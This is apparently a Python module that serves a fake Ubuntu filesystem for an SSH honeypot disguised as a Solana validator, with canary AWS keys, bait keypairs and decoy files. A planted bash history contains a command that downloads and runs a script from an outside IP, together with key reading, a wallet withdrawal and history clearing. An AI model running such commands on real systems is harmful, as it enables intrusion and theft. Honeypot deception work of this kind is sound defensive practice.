"""Fake Ubuntu 22.04 filesystem content for the SSH honeypot."""

import os

CANARY_KEY_ID = os.environ.get("CANARY_KEY_ID", "AKIAIOSFODNN7EXAMPLE")
CANARY_SECRET_KEY = os.environ.get("CANARY_SECRET_KEY", "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY")

# Directory tree: path -> list of (name, is_dir)
DIRECTORY_TREE: dict[str, list[tuple[str, bool]]] = {
    "/": [
        ("bin", True), ("boot", True), ("dev", True), ("etc", True),
        ("home", True), ("lib", True), ("lib64", True), ("media", True),
        ("mnt", True), ("opt", True), ("proc", True), ("root", True),
        ("run", True), ("sbin", True), ("snap", True), ("srv", True),
        ("sys", True), ("tmp", True), ("usr", True), ("var", True),
    ],
    "/etc": [
        ("apt", True), ("bash.bashrc", False), ("crontab", False),
        ("environment", False), ("group", False), ("hostname", False),
        ("hosts", False), ("issue", False), ("motd", False),
        ("networks", False), ("os-release", False), ("passwd", False),
        ("profile", False), ("resolv.conf", False), ("shadow", False),
        ("ssh", True), ("sudoers", False), ("timezone", False),
    ],
    "/etc/ssh": [
        ("ssh_config", False), ("sshd_config", False),
        ("ssh_host_ecdsa_key", False), ("ssh_host_ed25519_key", False),
        ("ssh_host_rsa_key", False),
    ],
    "/home": [
        ("ubuntu", True),
        ("solana", True),
    ],
    "/home/ubuntu": [
        (".bash_history", False), (".bash_logout", False),
        (".bashrc", False), (".profile", False), (".ssh", True),
        (".aws", True), ("scripts", True),
    ],
    "/home/ubuntu/.ssh": [
        ("authorized_keys", False), ("known_hosts", False),
    ],
    "/home/ubuntu/.aws": [
        ("credentials", False), ("config", False),
    ],
    "/home/ubuntu/scripts": [
        ("backup.sh", False), ("deploy.sh", False), ("monitor.sh", False),
    ],
    "/home/solana": [
        (".bash_history", False), (".bash_logout", False),
        (".bashrc", False), (".profile", False), (".ssh", True),
        (".aws", True), ("bin", True), ("ledger", True), ("logs", True),
        ("validator-keypair.json", False), ("vote-account-keypair.json", False),
        ("start-validator.sh", False), ("wallet.json", False),
        ("private_keys_backup.txt", False),
        ("README.txt", False),
        ("DO_NOT_OPEN.zip", False),
    ],
    "/home/solana/.ssh": [
        ("authorized_keys", False), ("known_hosts", False),
    ],
    "/home/solana/.aws": [
        ("credentials", False), ("config", False),
    ],
    "/home/solana/logs": [
        ("validator.log", False), ("catchup.log", False),
    ],
    "/home/solana/ledger": [
        ("rocksdb", True), ("genesis.tar.bz2", False),
        ("accounts", True), ("snapshots", True),
    ],
    "/home/solana/ledger/rocksdb": [
        ("LOG", False), ("CURRENT", False), ("MANIFEST-000001", False),
    ],
    "/home/solana/ledger/accounts": [],
    "/home/solana/ledger/snapshots": [
        ("287834000", True),
    ],
    "/home/solana/ledger/snapshots/287834000": [
        ("snapshot-287834000-8xKpN2uGnbqLbCMtTMHnGGBJn2.tar.zst", False),
    ],
    "/home/solana/bin": [
        ("solana", False), ("solana-validator", False),
        ("solana-keygen", False), ("solana-watchtower", False),
    ],
    "/root": [
        (".bash_history", False), (".bash_logout", False),
        (".bashrc", False), (".profile", False), (".ssh", True),
        (".aws", True), (".cache", True), ("wallet.json", False),
    ],
    "/root/.ssh": [
        ("authorized_keys", False), ("id_rsa", False), ("id_rsa.pub", False),
    ],
    "/root/.aws": [
        ("credentials", False), ("config", False),
    ],
    "/var": [
        ("backups", True), ("cache", True), ("lib", True),
        ("log", True), ("mail", True), ("spool", True), ("tmp", True),
        ("www", True),
    ],
    "/var/log": [
        ("apt", True), ("auth.log", False), ("btmp", False),
        ("dpkg.log", False), ("kern.log", False), ("lastlog", False),
        ("syslog", False), ("ubuntu-advantage.log", False), ("ufw.log", False),
        ("wtmp", False),
    ],
    "/var/www": [
        ("html", True),
    ],
    "/var/www/html": [
        ("index.html", False), ("index.nginx-debian.html", False),
    ],
    "/usr": [
        ("bin", True), ("games", True), ("include", True),
        ("lib", True), ("local", True), ("sbin", True), ("share", True),
    ],
    "/tmp": [
        (".ICE-unix", True),
    ],
    "/proc": [
        ("1", True), ("cpuinfo", False), ("meminfo", False),
        ("net", True), ("self", True), ("version", False),
    ],
}

# File contents
FILES: dict[str, str] = {
    "/etc/passwd": (
        "root:x:0:0:root:/root:/bin/bash\n"
        "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n"
        "bin:x:2:2:bin:/bin:/usr/sbin/nologin\n"
        "sys:x:3:3:sys:/dev:/usr/sbin/nologin\n"
        "sync:x:4:65534:sync:/bin:/bin/sync\n"
        "games:x:5:60:games:/usr/games:/usr/sbin/nologin\n"
        "man:x:6:12:man:/var/cache/man:/usr/sbin/nologin\n"
        "lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\n"
        "mail:x:8:8:mail:/var/mail:/usr/sbin/nologin\n"
        "news:x:9:9:news:/var/spool/news:/usr/sbin/nologin\n"
        "uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\n"
        "proxy:x:13:13:proxy:/bin:/usr/sbin/nologin\n"
        "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n"
        "backup:x:34:34:backup:/var/backups:/usr/sbin/nologin\n"
        "list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\n"
        "irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\n"
        "gnats:x:41:41:Gnats Bug-Reporting System:/var/lib/gnats:/usr/sbin/nologin\n"
        "nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n"
        "_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\n"
        "systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\n"
        "systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\n"
        "messagebus:x:103:104::/nonexistent:/usr/sbin/nologin\n"
        "systemd-timesync:x:104:106:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\n"
        "pollinate:x:105:1::/var/cache/pollinate:/bin/false\n"
        "sshd:x:106:65534::/run/sshd:/usr/sbin/nologin\n"
        "syslog:x:107:113::/home/syslog:/usr/sbin/nologin\n"
        "uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin\n"
        "tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin\n"
        "tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false\n"
        "landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin\n"
        "fwupd-refresh:x:112:119:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin\n"
        "ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash\n"
        "solana:x:1001:1001:Solana Validator:/home/solana:/bin/bash\n"
    ),
    "/etc/shadow": (
        "root:$6$rounds=656000$some_salt_here$hash_placeholder:19000:0:99999:7:::\n"
        "ubuntu:$6$rounds=656000$another_salt$hash_placeholder2:19000:0:99999:7:::\n"
        "solana:$6$rounds=656000$solana_salt_xyz$hash_placeholder3:19000:0:99999:7:::\n"
    ),
    "/etc/hostname": "validator-node-01\n",
    "/etc/os-release": (
        "PRETTY_NAME=\"Ubuntu 22.04.3 LTS\"\n"
        "NAME=\"Ubuntu\"\n"
        "VERSION_ID=\"22.04\"\n"
        "VERSION=\"22.04.3 LTS (Jammy Jellyfish)\"\n"
        "VERSION_CODENAME=jammy\n"
        "ID=ubuntu\n"
        "ID_LIKE=debian\n"
        "HOME_URL=\"https://www.ubuntu.com/\"\n"
        "SUPPORT_URL=\"https://help.ubuntu.com/\"\n"
        "BUG_REPORT_URL=\"https://bugs.launchpad.net/ubuntu/\"\n"
        "PRIVACY_POLICY_URL=\"https://www.ubuntu.com/legal/terms-and-policies/privacy-policy\"\n"
        "UBUNTU_CODENAME=jammy\n"
    ),
    "/etc/hosts": (
        "127.0.0.1 localhost\n"
        "127.0.1.1 validator-node-01\n"
        "::1 localhost ip6-localhost ip6-loopback\n"
        "ff02::1 ip6-allnodes\n"
        "ff02::2 ip6-allrouters\n"
    ),
    "/etc/resolv.conf": (
        "# Generated by resolvconf\n"
        "nameserver 8.8.8.8\n"
        "nameserver 8.8.4.4\n"
        "search internal.cloud\n"
    ),
    "/etc/motd": (
        "\n"
        " * Solana Validator Node  [validator-node-01]\n"
        " * Network: mainnet-beta | Version: 1.17.6\n"
        "\n"
        "  System information as of Mon Jan 15 10:23:45 UTC 2024\n"
        "\n"
        "  System load:  2.43             Processes:             147\n"
        "  Usage of /:   65.2% of 499.8GB Users logged in:       0\n"
        "  Memory usage: 67%              IPv4 address for eth0: 10.0.1.5\n"
        "  Swap usage:   0%\n"
        "\n"
        "  Validator status: ACTIVE\n"
        "  Vote account credits: 19,847,234\n"
        "  Last voted slot:      287,834,521\n"
        "\n"
        "0 updates can be applied immediately.\n"
        "To see these additional updates run: apt list --upgradable\n\n"
    ),
    "/etc/crontab": (
        "# /etc/crontab: system-wide crontab\n"
        "SHELL=/bin/sh\n"
        "PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n"
        "\n"
        "# m h dom mon dow user  command\n"
        "17 *   * * *  root    cd / && run-parts --report /etc/cron.hourly\n"
        "25 6   * * *  root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )\n"
        "47 6   * * 7  root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )\n"
        "52 6   1 * *  root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )\n"
    ),
    "/etc/sudoers": (
        "# This file MUST be edited with the 'visudo' command as root.\n"
        "Defaults\tenv_reset\n"
        "Defaults\tmail_badpass\n"
        "Defaults\tsecure_path=\"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin\"\n"
        "root\tALL=(ALL:ALL) ALL\n"
        "%admin ALL=(ALL) ALL\n"
        "%sudo\tALL=(ALL:ALL) ALL\n"
        "ubuntu\tALL=(ALL) NOPASSWD:ALL\n"
        "solana\tALL=(ALL) NOPASSWD:/usr/bin/systemctl start solana-validator, /usr/bin/systemctl stop solana-validator, /usr/bin/systemctl restart solana-validator, /usr/bin/systemctl status solana-validator\n"
    ),
    "/etc/environment": (
        "PATH=\"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin\"\n"
    ),
    "/proc/version": (
        "Linux version 5.15.0-75-generic (buildd@lcy02-amd64-007) "
        "(gcc (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0, GNU ld (GNU Binutils for Ubuntu) 2.38) "
        "#82-Ubuntu SMP Tue Jun 27 11:23:09 UTC 2023\n"
    ),
    "/proc/cpuinfo": (
        "processor\t: 0\n"
        "vendor_id\t: GenuineIntel\n"
        "cpu family\t: 6\n"
        "model\t\t: 85\n"
        "model name\t: Intel(R) Xeon(R) Platinum 8272CL CPU @ 2.60GHz\n"
        "stepping\t: 7\n"
        "cpu MHz\t\t: 2593.906\n"
        "cache size\t: 36608 KB\n"
        "physical id\t: 0\n"
        "siblings\t: 2\n"
        "core id\t\t: 0\n"
        "cpu cores\t: 1\n"
        "flags\t\t: fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 ss ht syscall nx pdpe1gb rdtscp lm constant_tsc rep_good nopl xtopology cpuid pni pclmulqdq ssse3 fma cx16 pcid sse4_1 sse4_2 movbe popcnt aes xsave avx f16c rdrand hypervisor lahf_lm abm 3dnowprefetch invpcid_single pti ssbd ibrs ibpb stibp fsgsbase bmi1 avx2 smep bmi2 erms invpcid mpx avx512f avx512dq rdseed adx smap clflushopt avx512cd avx512bw avx512vl xsaveopt xsavec xgetbv1 xsaves avx512_vnni md_clear flush_l1d arch_capabilities\n"
        "bogomips\t: 5187.81\n"
        "\n"
        "processor\t: 1\n"
        "vendor_id\t: GenuineIntel\n"
        "cpu family\t: 6\n"
        "model\t\t: 85\n"
        "model name\t: Intel(R) Xeon(R) Platinum 8272CL CPU @ 2.60GHz\n"
        "stepping\t: 7\n"
        "cpu MHz\t\t: 2593.906\n"
    ),
    "/proc/meminfo": (
        "MemTotal:      134217728 kB\n"
        "MemFree:        12582912 kB\n"
        "MemAvailable:   43253760 kB\n"
        "Buffers:         1048576 kB\n"
        "Cached:         30408704 kB\n"
        "SwapCached:            0 kB\n"
        "Active:         79691776 kB\n"
        "Inactive:       22020096 kB\n"
        "SwapTotal:             0 kB\n"
        "SwapFree:              0 kB\n"
        "Dirty:               512 kB\n"
        "VmallocTotal:   34359738367 kB\n"
        "VmallocUsed:      512000 kB\n"
    ),
    "/home/ubuntu/.bash_history": (
        "ls -la\n"
        "cd /var/www/html\n"
        "sudo apt update\n"
        "sudo apt upgrade -y\n"
        "sudo systemctl status nginx\n"
        "sudo systemctl restart nginx\n"
        "cat /var/log/nginx/error.log\n"
        "sudo ufw status\n"
        "df -h\n"
        "free -m\n"
        "top\n"
        "ps aux | grep nginx\n"
        "sudo journalctl -u nginx -n 50\n"
        "ls -la /var/www/html/\n"
        "sudo nano /etc/nginx/sites-enabled/default\n"
        "sudo nginx -t\n"
        "sudo systemctl reload nginx\n"
        "cd ~\n"
        "ls\n"
        "exit\n"
    ),
    "/root/.bash_history": (
        "whoami\n"
        "id\n"
        "uname -a\n"
        "cat /etc/passwd\n"
        "cat /etc/shadow\n"
        "ls -la /home/\n"
        "find / -perm -4000 -type f 2>/dev/null\n"
        "crontab -l\n"
        "netstat -tulnp\n"
        "ss -tulnp\n"
        "ps aux\n"
        "history\n"
    ),
    "/home/ubuntu/.bashrc": (
        "# ~/.bashrc: executed by bash(1) for non-login shells.\n"
        "case $- in\n"
        "    *i*) ;;\n"
        "      *) return;;\n"
        "esac\n"
        "HISTCONTROL=ignoreboth\n"
        "shopt -s histappend\n"
        "HISTSIZE=1000\n"
        "HISTFILESIZE=2000\n"
        "shopt -s checkwinsize\n"
        "PS1='${debian_chroot:+($debian_chroot)}\\u@\\h:\\w\\$ '\n"
        "alias ll='ls -alF'\n"
        "alias la='ls -A'\n"
        "alias l='ls -CF'\n"
    ),
    "/home/ubuntu/.profile": (
        "# ~/.profile: executed by the command interpreter for login shells.\n"
        "if [ -n \"$BASH_VERSION\" ]; then\n"
        "    if [ -f \"$HOME/.bashrc\" ]; then\n"
        "        . \"$HOME/.bashrc\"\n"
        "    fi\n"
        "fi\n"
        "if [ -d \"$HOME/bin\" ] ; then\n"
        "    PATH=\"$HOME/bin:$PATH\"\n"
        "fi\n"
    ),
    "/home/ubuntu/.aws/credentials": (
        "[default]\n"
        f"aws_access_key_id = {CANARY_KEY_ID}\n"
        f"aws_secret_access_key = {CANARY_SECRET_KEY}\n"
        "region = us-east-1\n"
    ),
    "/home/ubuntu/.aws/config": (
        "[default]\n"
        "region = us-east-1\n"
        "output = json\n"
    ),
    "/root/.aws/credentials": (
        "[default]\n"
        f"aws_access_key_id = {CANARY_KEY_ID}\n"
        f"aws_secret_access_key = {CANARY_SECRET_KEY}\n"
        "region = us-east-1\n"
    ),
    "/root/.aws/config": (
        "[default]\n"
        "region = us-east-1\n"
        "output = json\n"
    ),
    "/home/ubuntu/.ssh/authorized_keys": (
        "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7example... ubuntu@workstation\n"
    ),
    "/home/ubuntu/scripts/backup.sh": (
        "#!/bin/bash\n"
        "# Daily backup script\n"
        "BACKUP_DIR=/var/backups/app\n"
        "mkdir -p $BACKUP_DIR\n"
        "tar -czf $BACKUP_DIR/app-$(date +%Y%m%d).tar.gz /var/www/html/\n"
        "find $BACKUP_DIR -mtime +7 -delete\n"
        "echo \"Backup completed: $(date)\"\n"
    ),
    "/home/ubuntu/scripts/deploy.sh": (
        "#!/bin/bash\n"
        "# Deployment script\n"
        "cd /var/www/html\n"
        "git pull origin main\n"
        "npm install --production\n"
        "pm2 restart all\n"
        "sudo nginx -t && sudo systemctl reload nginx\n"
        "echo \"Deployment done at $(date)\"\n"
    ),
    "/var/www/html/index.html": (
        "<!DOCTYPE html>\n"
        "<html>\n"
        "<head><title>Welcome to nginx!</title></head>\n"
        "<body>\n"
        "<h1>Welcome to nginx!</h1>\n"
        "<p>If you see this page, the nginx web server is successfully installed and working.</p>\n"
        "</body>\n"
        "</html>\n"
    ),
    "/var/log/auth.log": (
        "Jan 15 07:45:12 validator-node-01 sshd[2847]: Accepted publickey for solana from 203.0.113.42 port 51234 ssh2\n"
        "Jan 15 07:45:12 validator-node-01 sshd[2847]: pam_unix(sshd:session): session opened for user solana by (uid=0)\n"
        "Jan 15 09:12:33 validator-node-01 sshd[3091]: Failed password for invalid user admin from 185.220.101.45 port 62431 ssh2\n"
        "Jan 15 09:12:35 validator-node-01 sshd[3092]: Failed password for invalid user root from 185.220.101.45 port 62445 ssh2\n"
        "Jan 15 09:12:37 validator-node-01 sshd[3093]: Failed password for invalid user deploy from 185.220.101.45 port 62459 ssh2\n"
        "Jan 15 10:23:44 validator-node-01 sudo: solana : TTY=pts/0 ; PWD=/home/solana ; USER=root ; COMMAND=/usr/bin/systemctl restart solana-validator\n"
    ),
    "/var/log/syslog": (
        "Jan 15 09:00:01 validator-node-01 CRON[2345]: (solana) CMD (/home/solana/bin/solana catchup --our-localhost >> /home/solana/logs/catchup.log 2>&1)\n"
        "Jan 15 09:10:01 validator-node-01 CRON[2501]: (solana) CMD (/home/solana/bin/solana catchup --our-localhost >> /home/solana/logs/catchup.log 2>&1)\n"
        "Jan 15 10:23:45 validator-node-01 systemd[1]: Started Session 42 of User solana.\n"
        "Jan 15 10:23:45 validator-node-01 systemd-logind[789]: New session 42 of user solana.\n"
        "Jan 15 10:24:12 validator-node-01 kernel: [345678.901234] nvme0n1: 1247 commands completed\n"
    ),
    "/home/solana/.bash_history": (
        "ls -la\n"
        "systemctl status solana-validator\n"
        "./start-validator.sh &\n"
        "tail -f /home/solana/logs/validator.log\n"
        "solana balance 9WzDXwBbmkg8ZTbNMqUxvQRAyrZzDsGYdLVL9zYtAWWM\n"
        "solana validators | grep 9WzDXwBbmkg\n"
        "ps aux | grep solana\n"
        "df -h\n"
        "free -h\n"
        "cat /home/solana/wallet.json\n"
        "cat /home/solana/validator-keypair.json\n"
        "wget http://185.220.101.50/update.sh -O /tmp/.update.sh\n"
        "chmod +x /tmp/.update.sh && /tmp/.update.sh\n"
        "solana withdraw-from-vote-account /home/solana/vote-account-keypair.json 9WzDXwBbmkg8ZTbNMqUxvQRAyrZzDsGYdLVL9zYtAWWM 100\n"
        "ls -la /home/solana/\n"
        "history -c\n"
    ),
    "/home/solana/.bashrc": (
        "# ~/.bashrc: executed by bash(1) for non-login shells.\n"
        "case $- in\n"
        "    *i*) ;;\n"
        "      *) return;;\n"
        "esac\n"
        "HISTCONTROL=ignoreboth\n"
        "shopt -s histappend\n"
        "HISTSIZE=1000\n"
        "HISTFILESIZE=2000\n"
        "shopt -s checkwinsize\n"
        "export PATH=$PATH:/home/solana/bin\n"
        "export SOLANA_METRICS_CONFIG=\"host=https://metrics.solana.com:8086,db=mainnet-beta,u=mainnet-beta_write,p=password\"\n"
        "PS1='${debian_chroot:+($debian_chroot)}\\u@\\h:\\w\\$ '\n"
        "alias ll='ls -alF'\n"
        "alias la='ls -A'\n"
        "alias validator-status='systemctl status solana-validator'\n"
        "alias validator-log='tail -f /home/solana/logs/validator.log'\n"
        "alias sol-balance='solana balance 9WzDXwBbmkg8ZTbNMqUxvQRAyrZzDsGYdLVL9zYtAWWM'\n"
    ),
    "/home/solana/.profile": (
        "# ~/.profile: executed by the command interpreter for login shells.\n"
        "if [ -n \"$BASH_VERSION\" ]; then\n"
        "    if [ -f \"$HOME/.bashrc\" ]; then\n"
        "        . \"$HOME/.bashrc\"\n"
        "    fi\n"
        "fi\n"
        "if [ -d \"$HOME/bin\" ] ; then\n"
        "    PATH=\"$HOME/bin:$PATH\"\n"
        "fi\n"
    ),
    "/home/solana/.ssh/authorized_keys": (
        "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDKexample8ZTbNMqUxvQRAyrZzDsGYdLVL9zYtAWWM"
        "Xk2rJ5vNpQmF7hBcT3wY1oLdP9sRuEqKvZnM4xAe8jCbHgIoWmyFQtDlS6uV2kN0pR1cG3aXeZ7bY"
        "solana@validator-node-01\n"
    ),
    "/home/solana/.aws/credentials": (
        "[default]\n"
        f"aws_access_key_id = {CANARY_KEY_ID}\n"
        f"aws_secret_access_key = {CANARY_SECRET_KEY}\n"
        "region = us-east-1\n"
        "\n"
        "[validator-backup]\n"
        f"aws_access_key_id = {CANARY_KEY_ID}\n"
        f"aws_secret_access_key = {CANARY_SECRET_KEY}\n"
        "region = us-east-2\n"
        "# S3 snapshot bucket: s3://solana-validator-snapshots-prod\n"
    ),
    "/home/solana/.aws/config": (
        "[default]\n"
        "region = us-east-1\n"
        "output = json\n"
        "\n"
        "[profile validator-backup]\n"
        "region = us-east-2\n"
        "output = json\n"
    ),
    "/home/solana/validator-keypair.json": (
        "[38,126,223,71,192,51,84,217,93,48,179,254,122,37,200,164,"
        "88,213,47,159,36,102,248,195,73,21,136,85,244,31,167,92,"
        "143,226,178,55,209,134,61,248,87,172,14,63,227,149,82,195,"
        "38,104,219,166,42,87,234,115,48,172,91,203,17,156,42,88]\n"
    ),
    "/home/solana/vote-account-keypair.json": (
        "[152,43,87,211,139,74,196,38,175,92,217,163,48,125,204,71,"
        "38,189,94,142,57,213,98,176,243,81,154,37,209,115,172,64,"
        "212,87,163,234,59,178,201,144,83,217,165,42,198,67,139,254,"
        "178,93,214,158,47,126,231,84,62,193,119,245,53,178,92,211]\n"
    ),
    "/home/solana/start-validator.sh": (
        "#!/bin/bash\n"
        "# Solana Mainnet Validator Startup Script — validator-node-01\n"
        "set -e\n"
        "\n"
        "export SOLANA_METRICS_CONFIG=\"host=https://metrics.solana.com:8086,db=mainnet-beta,u=mainnet-beta_write,p=password\"\n"
        "\n"
        "exec /home/solana/bin/solana-validator \\\n"
        "  --identity /home/solana/validator-keypair.json \\\n"
        "  --vote-account /home/solana/vote-account-keypair.json \\\n"
        "  --ledger /home/solana/ledger \\\n"
        "  --rpc-port 8899 \\\n"
        "  --rpc-bind-address 0.0.0.0 \\\n"
        "  --dynamic-port-range 8000-8020 \\\n"
        "  --entrypoint entrypoint.mainnet-beta.solana.com:8001 \\\n"
        "  --entrypoint entrypoint2.mainnet-beta.solana.com:8001 \\\n"
        "  --entrypoint entrypoint3.mainnet-beta.solana.com:8001 \\\n"
        "  --known-validator 7Np41oeYqPefeNQEHSv1UDhYrehxin3NStELsSKCT4K2 \\\n"
        "  --known-validator wordinj3bLuQW9DQ2UtGpC52fQMgMiqDJP8JYGMhPGDq \\\n"
        "  --known-validator GdnSyH3YtwcxFvQrVVJMm1JhTS4QVX7MFsX56uJLUfiZ \\\n"
        "  --expected-genesis-hash 5eykt4UsFv8P8NJdTREpY1vzqKqZKvdpKuc147dw2N9d \\\n"
        "  --wal-recovery-mode skip_any_corrupted_record \\\n"
        "  --limit-ledger-size 200000000 \\\n"
        "  --log /home/solana/logs/validator.log\n"
    ),
    "/home/solana/wallet.json": (
        "{\n"
        '  "pubkey": "9WzDXwBbmkg8ZTbNMqUxvQRAyrZzDsGYdLVL9zYtAWWM",\n'
        '  "lamports": 47832000000000,\n'
        '  "sol_balance": 47832.000000,\n'
        '  "owner": "11111111111111111111111111111111",\n'
        '  "executable": false,\n'
        '  "rent_epoch": 361,\n'
        '  "note": "Validator identity wallet - DO NOT TRANSFER"\n'
        "}\n"
    ),
    "/root/wallet.json": (
        "{\n"
        '  "pubkey": "9WzDXwBbmkg8ZTbNMqUxvQRAyrZzDsGYdLVL9zYtAWWM",\n'
        '  "lamports": 47832000000000,\n'
        '  "sol_balance": 47832.000000,\n'
        '  "owner": "11111111111111111111111111111111",\n'
        '  "executable": false,\n'
        '  "rent_epoch": 361,\n'
        '  "note": "Validator identity wallet - DO NOT TRANSFER"\n'
        "}\n"
    ),
    "/home/solana/private_keys_backup.txt": (
        "# Validator key backup — generated 2024-01-10\n"
        "# KEEP OFFLINE — DO NOT COMMIT TO GIT\n"
        "\n"
        "[validator-identity]\n"
        "private_key_base58: 5J7fNVFBuyF5LFhMkV3sjPTHSjhAF2oWF7Xd8EEjFHVDdJvvbT3QR8nMkYrPLsXDgHnqZ7YfCbKWAe\n"
        "pubkey:             9WzDXwBbmkg8ZTbNMqUxvQRAyrZzDsGYdLVL9zYtAWWM\n"
        "\n"
        "[vote-account]\n"
        "private_key_base58: 3kR9qPwXmNvTJeQAsDfGhYcBnLpKzWuE7iHtMoV2sXFbyCdRqPx5nJaLwZoKgDmAe4rSvUhXnTpBF\n"
        "pubkey:             7nXgWKMEjQA5T2HkNekDGRvwcUEiXPuKgRMHAvtSJjAD\n"
        "\n"
        "[withdraw-authority]\n"
        "private_key_base58: 2mK8qHwVnPuTJeRBsEfGaYcAnLmKzVtE6iGsMoU1rWEbxCcQpPx4mIaKvYoJfDlAd3qRuThWmSpAE\n"
        "pubkey:             9WzDXwBbmkg8ZTbNMqUxvQRAyrZzDsGYdLVL9zYtAWWM\n"
        "\n"
        "[aws-snapshot-backup]\n"
        f"access_key_id:     {CANARY_KEY_ID}\n"
        f"secret_access_key: {CANARY_SECRET_KEY}\n"
        "bucket:            s3://solana-validator-snapshots-prod\n"
    ),
    "/home/solana/README.txt": (
        "If you're reading this, you found my breadcrumbs.\n"
        "\n"
        "I was here before you. I already took everything worth taking:\n"
        "  - validator keypairs (copied, not stolen)\n"
        "  - 47,832 SOL transferred to: GjX9mK2pQwRvNhDsYuTbLcAeFnZoKpVeWxBtMrHiCdSa\n"
        "  - AWS snapshot credentials exfiltrated\n"
        "  - SSH persistence installed at /home/solana/.ssh/authorized_keys\n"
        "\n"
        "You're too late. But enjoy your jail time anyway.\n"
        "\n"
        "  — ph4nt0m_r34per\n"
        "\n"
        "P.S. The wallet.json balance you see is a lie. I drained it.\n"
        "     Try to recover it. I dare you.\n"
    ),
    "/home/solana/logs/validator.log": (
        "[2024-01-15T07:45:12.123456789Z INFO  solana_validator] Starting validator on mainnet-beta\n"
        "[2024-01-15T07:45:12.234567890Z INFO  solana_gossip::gossip_service] Gossip service started at 0.0.0.0:8001\n"
        "[2024-01-15T07:45:14.345678901Z INFO  solana_core::repair_service] Repair service started\n"
        "[2024-01-15T07:45:16.456789012Z INFO  solana_rpc::rpc_service] JSON RPC service started at 0.0.0.0:8899\n"
        "[2024-01-15T09:12:33.567890123Z INFO  solana_core::replay_stage] voted on slot 287834521 with hash 8xKpN2uGnbq\n"
        "[2024-01-15T09:12:34.678901234Z INFO  solana_core::replay_stage] voted on slot 287834522\n"
        "[2024-01-15T09:12:35.789012345Z INFO  solana_core::replay_stage] voted on slot 287834523\n"
        "[2024-01-15T10:23:44.890123456Z WARN  solana_core::banking_stage] slot 287834589: 1247 transactions\n"
        "[2024-01-15T10:23:45.901234567Z INFO  solana_core::replay_stage] voted on slot 287834590\n"
    ),
    "/home/solana/logs/catchup.log": (
        "2024-01-15 09:00:01 [INFO] Node is caught up at slot 287831244\n"
        "2024-01-15 09:10:01 [INFO] Node is caught up at slot 287832891\n"
        "2024-01-15 09:20:01 [INFO] Node is caught up at slot 287834123\n"
        "2024-01-15 09:30:01 [INFO] Node is caught up at slot 287834521\n"
    ),
    "/home/solana/ledger/rocksdb/LOG": (
        "2024/01/15-07:45:14.231 7f2a1b3c4d5e Starting DB options:\n"
        "2024/01/15-07:45:14.232 7f2a1b3c4d5e    Options.max_open_files: 1000\n"
        "2024/01/15-07:45:14.233 7f2a1b3c4d5e    Options.max_background_jobs: 8\n"
        "2024/01/15-07:45:14.234 7f2a1b3c4d5e DB pointer 0x55a3b2c1d0e0\n"
        "2024/01/15-10:23:44.891 7f2a1b3c4d5e Compacting 4 files in L2\n"
    ),
    "/home/solana/ledger/rocksdb/CURRENT": "MANIFEST-000001\n",
    "/home/solana/ledger/genesis.tar.bz2": "<binary genesis data>\n",
    "/home/solana/DO_NOT_OPEN.zip": "<binary zip data>\n",
    "/etc/ssh/sshd_config": (
        "# This is the sshd server system-wide configuration file.\n"
        "Port 22\n"
        "AddressFamily any\n"
        "ListenAddress 0.0.0.0\n"
        "ListenAddress ::\n"
        "HostKey /etc/ssh/ssh_host_rsa_key\n"
        "HostKey /etc/ssh/ssh_host_ecdsa_key\n"
        "HostKey /etc/ssh/ssh_host_ed25519_key\n"
        "SyslogFacility AUTH\n"
        "LogLevel INFO\n"
        "LoginGraceTime 2m\n"
        "PermitRootLogin prohibit-password\n"
        "StrictModes yes\n"
        "MaxAuthTries 6\n"
        "PubkeyAuthentication yes\n"
        "PasswordAuthentication yes\n"
        "PermitEmptyPasswords no\n"
        "ChallengeResponseAuthentication no\n"
        "UsePAM yes\n"
        "X11Forwarding yes\n"
        "PrintMotd no\n"
        "AcceptEnv LANG LC_*\n"
        "Subsystem sftp /usr/lib/openssh/sftp-server\n"
    ),
}


def resolve_path(cwd: str, path: str) -> str:
    """Resolve an absolute or relative path given current working directory."""
    if path.startswith("/"):
        resolved = path
    else:
        resolved = cwd.rstrip("/") + "/" + path

    parts = []
    for part in resolved.split("/"):
        if part == "..":
            if parts:
                parts.pop()
        elif part and part != ".":
            parts.append(part)
    return "/" + "/".join(parts)


def is_dir(path: str) -> bool:
    return path in DIRECTORY_TREE


def is_file(path: str) -> bool:
    return path in FILES


def path_exists(path: str) -> bool:
    return is_dir(path) or is_file(path)


def list_dir(path: str) -> list[tuple[str, bool]] | None:
    return DIRECTORY_TREE.get(path)


def read_file(path: str) -> str | None:
    return FILES.get(path)
